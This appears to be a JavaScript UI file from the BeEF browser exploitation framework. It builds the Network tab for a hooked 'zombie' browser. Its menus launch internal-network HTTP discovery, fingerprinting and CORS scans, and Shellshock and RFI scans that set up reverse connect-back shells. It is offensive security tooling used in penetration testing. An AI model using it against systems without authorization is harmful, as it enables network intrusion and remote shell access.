//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*
 * The Network tab panel for the selected zombie.
 * Loaded in /ui/panel/index.html
 */
ZombieTab_Network = function(zombie) {
	
	// The status bar.
	var commands_statusbar = new Beef_StatusBar('network-bbar-zombie-'+zombie.session);
	// RESTful API token
	var token = beefwui.get_rest_token();

        var get_module_id = function(name){
                var id = "";                            
        $jwterm.ajax({
            type: 'GET',                                        
            url: "/api/modules/search/" + name + "?token=" + token,
            async: false,                                       
            processData: false,                                 
            success: function(data){                            
                id = data.id;                                   
            },                                                  
            error: function(){                                  
                //update_fail("Error getting module id.");               
            }                                                           
        });                                                     
                return id;                                      
        }                   

	/*
	 * The panel that displays all identified network services grouped by host
	 ********************************************/
	var hosts_panel_store = new Ext.ux.data.PagingJsonStore({
		storeId: 'network-host-store-zombie-'+zombie.session,
		proxy: new Ext.data.HttpProxy({
			url: '/api/network/hosts/'+zombie.session+'?token='+token,
			method: 'GET'
		}),
		remoteSort: false,
		autoDestroy: true,
		autoLoad: false,
		root: 'hosts',
		fields: ['id', 'ip', 'hostname', 'type', 'os', 'mac'],
		sortInfo: {field: 'ip', direction: 'ASC'}
	});

	var req_pagesize = 50;

	var hosts_panel_bbar = new Ext.PagingToolbar({
		pageSize: req_pagesize,
		store: hosts_panel_store,
		displayInfo: true,
		displayMsg: 'Displaying network hosts {0} - {1} of {2}',
		emptyMsg: 'No hosts to display'
	});

	var hosts_panel_grid = new Ext.grid.GridPanel({
		id: 'network-host-grid-zombie-'+zombie.session,
		store: hosts_panel_store,
		bbar: hosts_panel_bbar,
		border: false,
		loadMask: {msg:'Loading network hosts...'},
		
		viewConfig: {
			forceFit: true
		},
		
		view: new Ext.grid.GridView({
			forceFit: true,
			emptyText: "No hosts",
			enableRowBody:true
		}),
		
		columns: [
			{header: 'Id', width: 5, sortable: true, dataIndex: 'id', hidden:true},
                        {header: 'IP Address', width: 10, sortable: true, dataIndex: 'ip', renderer: function(value){return $jEncoder.encoder.encodeForHTML(value)}},
			{header: 'Host Name', width: 10, sortable: true, dataIndex: 'hostname', renderer: function(value){return $jEncoder.encoder.encodeForHTML(value)}},
			{header: 'Type', width: 20, sortable: true, dataIndex: 'type', renderer: function(value){return $jEncoder.encoder.encodeForHTML(value)}},
			{header: 'Operating System', width: 10, sortable: true, dataIndex: 'os', renderer: function(value){return $jEncoder.encoder.encodeForHTML(value)}},
			{header: 'MAC Address', width: 10, sortable: true, dataIndex: 'mac', renderer: function(value){return $jEncoder.encoder.encodeForHTML(value)}}
		],
		
		listeners: {
			rowclick: function(grid, rowIndex) {
				var r = grid.getStore().getAt(rowIndex).data;
			},
			containercontextmenu: function(view, e) {
				e.preventDefault();
			},
			contextmenu: function(e, element, options) {
				e.preventDefault();
			},
			rowcontextmenu: function(grid, rowIndex, e) {
				e.preventDefault();
				grid.getSelectionModel().selectRow(rowIndex);
				if (!!grid.rowCtxMenu) {
					grid.rowCtxMenu.destroy();
				}
				var record = grid.selModel.getSelected();
				var ip = record.get('ip');
				var class_c = ip.split(".")[0]+"."+ip.split(".")[1]+"."+ip.split(".")[2];
				var ip_range = class_c+'.1-'+class_c+'.255';
				grid.rowCtxMenu = new Ext.menu.Menu({
					items: [
					{
                                                text: 'Discover HTTP',
                                                menu: {
                                                  xtype: 'menu',
                                                  items: [{
                                                        text: 'Host ('+ip+')',
                                                        iconCls: 'network-host-ctxMenu-host',
                                                        handler: function() {
                                                                var mod_id = get_module_id("get_http_servers");
                                                                commands_statusbar.update_sending('Fingerprinting ' + ip + '...');
                                                                $jwterm.ajax({
                                                                        contentType: 'application/json',
                                                                        data: JSON.stringify({"ipRange":ip+'-'+ip}),
                                                                        dataType: 'json',
                                                                        type: 'POST',
                                                                        url: "/api/modules/" + zombie.session + "/" + mod_id + "?token=" + token,
                                                                        async: false,
                                                                        processData: false,
                                                                        success: function(data){
                                                                                commands_statusbar.update_sent("Command [" + data.command_id + "] sent successfully");
                                                                        },
                                                                        error: function(){
                                                                                commands_statusbar.update_fail('Error sending command');
                                                                        }
                                                                });
                                                        }
                                                  },{
                                                        text: 'Network ('+class_c+'.0/24)',
                                                        iconCls: 'network-host-ctxMenu-network',
                                                        handler: function() {
                                                                var mod_id = get_module_id("get_http_servers");
                                                                commands_statusbar.update_sending('Scanning ' + ip_range + ' for HTTP servers...');
                                                                $jwterm.ajax({
                                                                        contentType: 'application/json',
                                                                        data: JSON.stringify({"ipRange":ip_range}),
                                                                        dataType: 'json',
                                                                        type: 'POST',
                                                                        url: "/api/modules/" + zombie.session + "/" + mod_id + "?token=" + token,
                                                                        async: false,
                                                                        processData: false,
                                                                        success: function(data){
                                                                                commands_statusbar.update_sent("Command [" + data.command_id + "] sent successfully");
                                                                        },
                                                                        error: function(){
                                                                                commands_statusbar.update_fail('Error sending command');
                                                                        }
                                                                });
                                                         }
                                                  }]
                                                }
                                        },{
						text: 'Fingerprint HTTP',
						iconCls: 'network-host-ctxMenu-fingerprint',
						menu: {
						  xtype: 'menu',
						  items: [{
                                                        text: 'Host ('+ip+')',
							iconCls: 'network-host-ctxMenu-host',
                                                	handler: function() {
                                                        	var mod_id = get_module_id("internal_network_fingerprinting");
                                                        	commands_statusbar.update_sending('Fingerprinting ' + ip + '...');
                                                        	$jwterm.ajax({
                                                                	contentType: 'application/json',
                                                                	data: JSON.stringify({"ipRange":ip+'-'+ip}),
	                                                                dataType: 'json',
	                                                                type: 'POST',
	                                                                url: "/api/modules/" + zombie.session + "/" + mod_id + "?token=" + token,
	                                                                async: false,
	                                                                processData: false,
	                                                                success: function(data){
	                                                                        commands_statusbar.update_sent("Command [" + data.command_id + "] sent successfully");
	                                                                },
	                                                                error: function(){
	                                                                        commands_statusbar.update_fail('Error sending command');
	                                                                }
	                                                        });
                                                	}
                                        	  },{
							text: 'Network ('+class_c+'.0/24)',
							iconCls: 'network-host-ctxMenu-network',
                                                        handler: function() {
	                                                        var mod_id = get_module_id("internal_network_fingerprinting");
	                                                        commands_statusbar.update_sending('Fingerprinting ' + ip_range + '...');
	                                                        $jwterm.ajax({
	                                                                contentType: 'application/json',
	                                                                data: JSON.stringify({"ipRange":ip_range}),
	                                                                dataType: 'json',
	                                                                type: 'POST',
	                                                                url: "/api/modules/" + zombie.session + "/" + mod_id + "?token=" + token,
	                                                                async: false,
	                                                                processData: false,
	                                                                success: function(data){
	                                                                        commands_statusbar.update_sent("Command [" + data.command_id + "] sent successfully");
	                                                                },
	                                                                error: function(){
	                                                                        commands_statusbar.update_fail('Error sending command');
	                                                                }
	                                                        });
	                                                 }
						  }]
						}
					},{
						text: 'CORS Scan',
						iconCls: 'network-host-ctxMenu-cors',
                                                menu: {
                                                  xtype: 'menu',
                                                  items: [{
                                                        text: 'Host ('+ip+')',
							iconCls: 'network-host-ctxMenu-host',
                                                        handler: function() {
								var mod_id = get_module_id("cross_origin_scanner");
	                                                        commands_statusbar.update_sending('CORS scanning ' + ip + '...');
	                                                        $jwterm.ajax({
	                                                                contentType: 'application/json',
	                                                                data: JSON.stringify({"ipRange":ip+'-'+ip}),
	                                                                dataType: 'json',
	                                                                type: 'POST',
	                                                                url: "/api/modules/" + zombie.session + "/" + mod_id + "?token=" + token,
	                                                                async: false,
	                                                                processData: false,
	                                                                success: function(data){
	                                                                        commands_statusbar.update_sent("Command [" + data.command_id + "] sent successfully");
	                                                                },
	                                                                error: function(){
	                                                                        commands_statusbar.update_fail('Error sending command');
	                                                                }
	                                                        });
                                                        }
						  },{
                                                        text: 'Network ('+class_c+'.0/24)',
							iconCls: 'network-host-ctxMenu-network',
                                                        handler: function() {
	                                                        var mod_id = get_module_id("cross_origin_scanner");
	                                                        commands_statusbar.update_sending('CORS scanning ' + ip_range + '...');
	                                                        $jwterm.ajax({
	                                                                contentType: 'application/json',
	                                                                data: JSON.stringify({"ipRange":ip_range}),
	                                                                dataType: 'json',
	                                                                type: 'POST',
	                                                                url: "/api/modules/" + zombie.session + "/" + mod_id + "?token=" + token,
	                                                                async: false,
	                                                                processData: false,
	                                                                success: function(data){
	                                                                        commands_statusbar.update_sent("Command [" + data.command_id + "] sent successfully");
	                                                                },
	                                                                error: function(){
	                                                                        commands_statusbar.update_fail('Error sending command');
	                                                                }
	                                                        });
                                                        }
                                                  }]
						}
                                        }]
				});
				grid.rowCtxMenu.showAt(e.getXY());
			},
			afterrender: function(datagrid) {
				datagrid.store.reload();
			}

		}
	});
	
	var hosts_panel = new Ext.Panel({
		id: 'network-host-panel-zombie-'+zombie.session,
		title: 'Hosts',
		items:[hosts_panel_grid],
		layout: 'fit',
		listeners: {
			activate: function(hosts_panel) {
				hosts_panel.items.items[0].store.reload();
			}
		}
	});

        /*
         * The panel that displays all identified network services sorted by host
         ********************************************/
        var services_panel_store = new Ext.ux.data.PagingJsonStore({
		storeId: 'network-services-store-zombie-'+zombie.session,
		proxy: new Ext.data.HttpProxy({
			url: '/api/network/services/'+zombie.session+'?token='+token,
			method: 'GET'
		}),
                remoteSort: false,
                autoDestroy: true,
                autoLoad: false,
                root: 'services',
                fields: ['id', 'proto', 'ip', 'port', 'type'],
                sortInfo: {field: 'ip', direction: 'ASC'}
        });

        var req_pagesize = 50;

        var services_panel_bbar = new Ext.PagingToolbar({
                pageSize: req_pagesize,
                store: services_panel_store,
                displayInfo: true,
                displayMsg: 'Displaying network services {0} - {1} of {2}',
                emptyMsg: 'No services to display'
        });

        var services_panel_grid = new Ext.grid.GridPanel({
                id: 'network-services-grid-zombie-'+zombie.session,
                store: services_panel_store,
                bbar: services_panel_bbar,
                border: false,
                loadMask: {msg:'Loading network services...'},

                viewConfig: {
                        forceFit: true
                },

                view: new Ext.grid.GridView({
                        forceFit: true,
                        emptyText: "No services",
                        enableRowBody:true
                }),

                columns: [
                        {header: 'Id', width: 5, sortable: true, dataIndex: 'id', hidden:true},
                        {header: 'IP Address', width: 10, sortable: true, dataIndex: 'ip', renderer: function(value){return $jEncoder.encoder.encodeForHTML(value)}},
                        {header: 'Port', width: 5, sortable: true, dataIndex: 'port', renderer: function(value){return $jEncoder.encoder.encodeForHTML(value)}},
                        {header: 'Protocol', width: 5, sortable: true, dataIndex: 'proto', renderer: function(value){return $jEncoder.encoder.encodeForHTML(value)}},
                        {header: 'Type', width: 20, sortable: true, dataIndex: 'type', renderer: function(value){return $jEncoder.encoder.encodeForHTML(value)}}
                ],

                listeners: {
                        rowclick: function(grid, rowIndex) {
                                var r = grid.getStore().getAt(rowIndex).data;
                        },
                        containercontextmenu: function(view, e) {
                                e.preventDefault();
                        },
                        contextmenu: function(e, element, options) {
                                e.preventDefault();
                        },
                        rowcontextmenu: function(grid, rowIndex, e) {
                                e.preventDefault();
                                grid.getSelectionModel().selectRow(rowIndex);
				if (!!grid.rowCtxMenu) {
					grid.rowCtxMenu.destroy();
				} 
				var record = grid.selModel.getSelected();
				var ip = record.get('ip');
				var port = record.get('port');
                                var proto = record.get('proto');
				grid.rowCtxMenu = new Ext.menu.Menu({
					items: [{
					  text: 'Scan ('+ip+':'+port+'/'+proto+')',
					  iconCls: 'network-host-ctxMenu-host',
					  menu: {
						xtype: 'menu',
						items: [{
                                                        text: 'Fingerprint HTTP',
							iconCls: 'network-host-ctxMenu-fingerprint',
                                                        handler: function() {
	                                                        var mod_id = get_module_id("internal_network_fingerprinting");
	                                                        commands_statusbar.update_sending('Fingerprinting ' + ip + '...'); 
	                                                        $jwterm.ajax({
	                                                                contentType: 'application/json',
	                                                                data: JSON.stringify({"ipRange":ip+'-'+ip, "ports":port}),
	                                                                dataType: 'json',
	                                                                type: 'POST',
	                                                                url: "/api/modules/" + zombie.session + "/" + mod_id + "?token=" + token,
	                                                                async: false,
	                                                                processData: false,
	                                                                success: function(data){
	                                                                        commands_statusbar.update_sent("Command [" + data.command_id + "] sent successfully");
	                                                                },
	                                                                error: function(){
	                                                                        commands_statusbar.update_fail('Error sending command');
	                                                                }
	                                                        });
                                                        }
                                                },{
                                                        text: 'CORS Scan',
							iconCls: 'network-host-ctxMenu-cors',
                                                        handler: function() {
	                                                        var mod_id = get_module_id("cross_origin_scanner");
	                                                        commands_statusbar.update_sending('CORS scanning ' + ip + '...');
	                                                        $jwterm.ajax({
	                                                                contentType: 'application/json',
	                                                                data: JSON.stringify({"ipRange":ip+'-'+ip, "ports":port}),
	                                                                dataType: 'json',
	                                                                type: 'POST',
	                                                                url: "/api/modules/" + zombie.session + "/" + mod_id + "?token=" + token,
	                                                                async: false,
	                                                                processData: false,
	                                                                success: function(data){
	                                                                        commands_statusbar.update_sent("Command [" + data.command_id + "] sent successfully");
	                                                                },
	                                                                error: function(){
	                                                                        commands_statusbar.update_fail('Error sending command');
	                                                                }
	                                                        });
                                                        }
                                                },{
                                                        text: 'Shellshock Scan',
							iconCls: 'network-host-ctxMenu-shellshock',
                                                        handler: function() {
                                                                var mod_id = get_module_id("shell_shock_scanner");
								var lhost = prompt("Enter local IP for connect back shell:", 'LHOST');
                                                                var lport = prompt("Enter local port for connect back shell:", 'LPORT');
								alert("Now start your reverse shell handler on " + lhost + ':' + lport);
                                                                commands_statusbar.update_sending('Shellshock scanning ' + ip + '...');
                                                                $jwterm.ajax({
                                                                        contentType: 'application/json',
                                                                        data: JSON.stringify({"rproto":proto, "rhost":ip, "rport":port, "lhost":lhost, "lport":lport}),
                                                                        dataType: 'json',
                                                                        type: 'POST',
                                                                        url: "/api/modules/" + zombie.session + "/" + mod_id + "?token=" + token,
                                                                        async: false,
                                                                        processData: false,
                                                                        success: function(data){
                                                                                commands_statusbar.update_sent("Command [" + data.command_id + "] sent successfully");
                                                                        },
                                                                        error: function(){
                                                                                commands_statusbar.update_fail('Error sending command');
                                                                        }
                                                                });
                                                        }
                                                },{
                                                        text: 'RFI Scan',
                                                        iconCls: 'network-host-ctxMenu-php',
                                                        handler: function() {
                                                                var mod_id = get_module_id("rfi_scanner");
                                                                var lhost = prompt("Enter local IP for connect back shell:", 'LHOST');
                                                                var lport = prompt("Enter local port for connect back shell:", 'LPORT');
                                                                var payload_url = prompt("Enter BeEF server URL:", 'http://beef_host:beef_port/');
								alert("Now start your reverse shell handler on " + lhost + ':' + lport);
                                                                commands_statusbar.update_sending('Shellshock scanning ' + ip + '...');
                                                                $jwterm.ajax({
                                                                        contentType: 'application/json',
                                                                        data: JSON.stringify({"rproto":proto, "rhost":ip, "rport":port, "lhost":lhost, "lport":lport, "payload_url":payload_url, "payload":"reverse_php"}),
                                                                        dataType: 'json',
                                                                        type: 'POST',
                                                                        url: "/api/modules/" + zombie.session + "/" + mod_id + "?token=" + token,
                                                                        async: false,
                                                                        processData: false,
                                                                        success: function(data){
                                                                                commands_statusbar.update_sent("Command [" + data.command_id + "] sent successfully");
                                                                        },
                                                                        error: function(){
                                                                                commands_statusbar.update_fail('Error sending command');
                                                                        }
                                                                });
                                                        }
                                                }]
					  }
					}]
                                });
                                grid.rowCtxMenu.showAt(e.getXY());
                        },
                        afterrender: function(datagrid) {
                                datagrid.store.reload();
                        }

                }
        });

	var services_panel = new Ext.Panel({
		id: 'network-services-panel-zombie-'+zombie.session,
		title: 'Services',
		items:[services_panel_grid],
		layout: 'fit',
		listeners: {
			activate: function(services_panel) {
				services_panel.items.items[0].store.reload();
			}
		}
	});

        /*
         * The Network tab constructor
         ********************************************/
	ZombieTab_Network.superclass.constructor.call(this, {
		id: 'zombie-network-tab-zombie-'+zombie.session,
		title: 'Network',
		activeTab: 0,
		viewConfig: {
			forceFit: true,
			stripRows: true,
			type: 'fit'
		},
        	items: [hosts_panel, services_panel],
		bbar: commands_statusbar,
		listeners: {
		}
	});
	
};

Ext.extend(ZombieTab_Network, Ext.TabPanel, {});
